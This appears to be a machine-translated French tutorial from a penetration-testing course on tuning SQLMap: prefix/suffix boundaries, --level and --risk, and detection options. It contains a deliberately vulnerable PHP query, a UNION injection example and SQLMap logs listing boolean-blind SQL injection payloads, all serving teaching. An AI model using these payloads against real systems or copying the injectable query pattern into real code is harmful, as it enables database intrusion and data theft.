Réglage de l'attaque
====================

* * * * *

Dans la plupart des cas, SQLMap devrait être prêt à l'emploi avec les détails de la cible fournis. Néanmoins, il existe des options pour affiner les tentatives d'injection SQLi afin d'aider SQLMap dans la phase de détection. Chaque charge utile envoyée à la cible se compose de :

-   vecteur (par exemple, `UNION ALL SELECT 1,2,VERSION()`) : partie centrale de la charge utile, transportant le code SQL utile à exécuter sur la cible.

-   limites (par exemple `'<vector>-- -`) : formations de préfixes et de suffixes, utilisées pour une injection correcte du vecteur dans l'instruction SQL vulnérable.

* * * * *

Préfixe suffixe
---------------

Dans de rares cas, des valeurs de préfixe et de suffixe spéciales sont requises, non couvertes par l'exécution régulière de SQLMap.\
Pour de telles exécutions, les options `--prefix`et `--suffix`peuvent être utilisées comme suit :

Code : bash

```
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"

```

Cela entraînera une enceinte de toutes les valeurs vectorielles entre le préfixe statique `%'))`et le suffixe `-- -`.\
Par exemple, si le code vulnérable sur la cible est :

Code : php

```
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);

```

Le vecteur `UNION ALL SELECT 1,2,VERSION()`, délimité par le préfixe `%'))`et le suffixe `-- -`, donnera lieu à l'instruction SQL (valide) suivante sur la cible :

Code : sql

```
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1

```

* * * * *

Niveau/Risque
-------------

Par défaut, SQLMap combine un ensemble prédéfini de limites les plus courantes (c'est-à-dire des paires préfixe/suffixe), ainsi que les vecteurs ayant de grandes chances de succès en cas de cible vulnérable. Néanmoins, les utilisateurs ont la possibilité d'utiliser des ensembles plus grands de limites et de vecteurs, déjà incorporés dans SQLMap.

Pour de telles demandes, les options `--level`et `--risk`doivent être utilisées :

-   L'option `--level`( `1-5`, par défaut `1`) étend à la fois les vecteurs et les limites utilisés, en fonction de leur espérance de réussite (c'est-à-dire que plus l'espérance est faible, plus le niveau est élevé).

-   L'option `--risk`( `1-3`, par défaut `1`) étend l'ensemble de vecteurs utilisés en fonction du risque de causer des problèmes du côté cible (c'est-à-dire le risque de perte d'entrée dans la base de données ou de déni de service).

La meilleure façon de vérifier les différences entre les limites utilisées et les charges utiles pour différentes valeurs de `--level`et `--risk`est d'utiliser l' `-v`option permettant de définir le niveau de verbosité. En verbosité 3 ou supérieure (par exemple `-v 3`), les messages contenant le utilisé `[PAYLOAD]`seront affichés, comme suit :

```
dsgsec@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5

...SNIP...
[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:17:07] [PAYLOAD] 1) AND 5907=7031-- AuiO
[14:17:07] [PAYLOAD] 1) AND 7891=5700 AND (3236=3236
...SNIP...
[14:17:07] [PAYLOAD] 1')) AND 1049=6686 AND (('OoWT' LIKE 'OoWT
[14:17:07] [PAYLOAD] 1'))) AND 4534=9645 AND ((('DdNs' LIKE 'DdNs
[14:17:07] [PAYLOAD] 1%' AND 7681=3258 AND 'hPZg%'='hPZg
...SNIP...
[14:17:07] [PAYLOAD] 1")) AND 4540=7088 AND (("hUye"="hUye
[14:17:07] [PAYLOAD] 1"))) AND 6823=7134 AND ((("aWZj"="aWZj
[14:17:07] [PAYLOAD] 1" AND 7613=7254 AND "NMxB"="NMxB
...SNIP...
[14:17:07] [PAYLOAD] 1"="1" AND 3219=7390 AND "1"="1
[14:17:07] [PAYLOAD] 1' IN BOOLEAN MODE) AND 1847=8795#
[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'

```

D'un autre côté, les charges utiles utilisées avec la `--level`valeur par défaut ont un ensemble de limites considérablement plus petit :

```
dsgsec@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3
...SNIP...
[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:20:36] [PAYLOAD] 1) AND 2678=8644 AND (3836=3836
[14:20:36] [PAYLOAD] 1 AND 7496=4313
[14:20:36] [PAYLOAD] 1 AND 7036=6691-- DmQN
[14:20:36] [PAYLOAD] 1') AND 9393=3783 AND ('SgYz'='SgYz
[14:20:36] [PAYLOAD] 1' AND 6214=3411 AND 'BhwY'='BhwY
[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'

```

Quant aux vecteurs, nous pouvons comparer les charges utiles utilisées comme suit :

```
dsgsec@htb[/htb]$ sqlmap -u www.example.com/?id=1
...SNIP...
[14:42:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:42:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:42:38] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
...SNIP...

```

```
dsgsec@htb[/htb]$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3

...SNIP...
[14:46:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
...SNIP...
[14:46:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[14:46:05] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[14:46:05] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
...SNIP...
[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[14:46:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
...SNIP...
[14:46:05] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[14:46:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[14:46:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
...SNIP...

```

Quant au nombre de charges utiles, par défaut (c'est-à-dire `--level=1 --risk=1`), le nombre de charges utiles utilisées pour tester un seul paramètre va jusqu'à 72, tandis que dans le cas le plus détaillé ( ) `--level=5 --risk=3`le nombre de charges utiles passe à 7 865.

Comme SQLMap est déjà configuré pour vérifier les limites et les vecteurs les plus courants, il est conseillé aux utilisateurs réguliers de ne pas toucher à ces options car cela ralentirait considérablement l'ensemble du processus de détection. Néanmoins, dans des cas particuliers de vulnérabilités SQLi, où l'utilisation de `OR`charges utiles est indispensable (par exemple, dans le cas de `login`pages), nous devrons peut-être augmenter le niveau de risque nous-mêmes.

En effet, `OR`les charges utiles sont intrinsèquement dangereuses dans une exécution par défaut, où les instructions SQL vulnérables sous-jacentes (bien que moins fréquemment) modifient activement le contenu de la base de données (par exemple `DELETE`ou `UPDATE`).

* * * * *

Réglage avancé
--------------

Pour affiner davantage le mécanisme de détection, il existe un vaste ensemble de commutateurs et d'options. Dans les cas habituels, SQLMap ne nécessitera pas son utilisation. Néanmoins, nous devons les connaître afin de pouvoir les utiliser en cas de besoin.

#### Codes d'état

Par exemple, lorsqu'il s'agit d'une réponse cible énorme avec beaucoup de contenu dynamique, des différences subtiles entre les réponses `TRUE`et `FALSE`pourraient être utilisées à des fins de détection. Si la différence entre les réponses `TRUE`et `FALSE`peut être vue dans les codes HTTP (par exemple `200`for `TRUE`et `500`for `FALSE`), l'option `--code`pourrait être utilisée pour corriger la détection des `TRUE`réponses à un code HTTP spécifique (par exemple `--code=200`).

#### Titres

Si la différence entre les réponses peut être constatée en inspectant les titres des pages HTTP, le commutateur `--titles`pourrait être utilisé pour demander au mécanisme de détection de baser la comparaison sur le contenu de la balise HTML `<title>`.

#### Cordes

Dans le cas d'une valeur de chaîne spécifique apparaissant dans `TRUE`les réponses (par exemple `success`), alors qu'elle est absente dans `FALSE`les réponses, l'option `--string`pourrait être utilisée pour fixer la détection en fonction uniquement de l'apparition de cette valeur unique (par exemple `--string=success`).

#### Texte seulement

Lorsque nous traitons de nombreux contenus cachés, tels que certaines balises de comportement de page HTML (par exemple `<script>`, `<style>`, `<meta>`, etc.), nous pouvons utiliser le `--text-only`commutateur, qui supprime toutes les balises HTML et base la comparaison uniquement sur le texte (c'est-à-dire visible). ) contenu.

#### Techniques

Dans certains cas particuliers, nous devons limiter les charges utiles utilisées à un certain type uniquement. Par exemple, si les charges utiles aveugles basées sur le temps provoquent des problèmes sous la forme de délais d'attente de réponse, ou si nous souhaitons forcer l'utilisation d'un type de charge utile SQLi spécifique, l'option peut spécifier `--technique`la technique SQLi à utiliser.

Par exemple, si nous voulons ignorer les charges utiles SQLi aveugles et empilées basées sur le temps et tester uniquement les charges utiles aveugles booléennes, basées sur les erreurs et les requêtes UNION, nous pouvons spécifier ces techniques avec `--technique=BEU`.

#### Réglage UNION SQLi

Dans certains cas, `UNION`les charges utiles SQLi nécessitent des informations supplémentaires fournies par l'utilisateur pour fonctionner. Si nous pouvons trouver manuellement le nombre exact de colonnes de la requête SQL vulnérable, nous pouvons fournir ce nombre à SQLMap avec l'option `--union-cols`(par exemple `--union-cols=17`). Dans le cas où les valeurs de remplissage "factices" par défaut utilisées par SQLMap - `NULL`et les entiers aléatoires - ne sont pas compatibles avec les valeurs des résultats de la requête SQL vulnérable, nous pouvons spécifier une valeur alternative à la place (par exemple `--union-char='a'`).

De plus, s'il est nécessaire d'utiliser une annexe à la fin d'une `UNION`requête sous la forme de `FROM <table>`(par exemple, dans le cas d'Oracle), nous pouvons le définir avec l'option `--union-from`(par exemple `--union-from=users`).\
Le fait de ne pas utiliser `FROM`automatiquement l'annexe appropriée peut être dû à l'incapacité de détecter le nom du SGBD avant son utilisation.
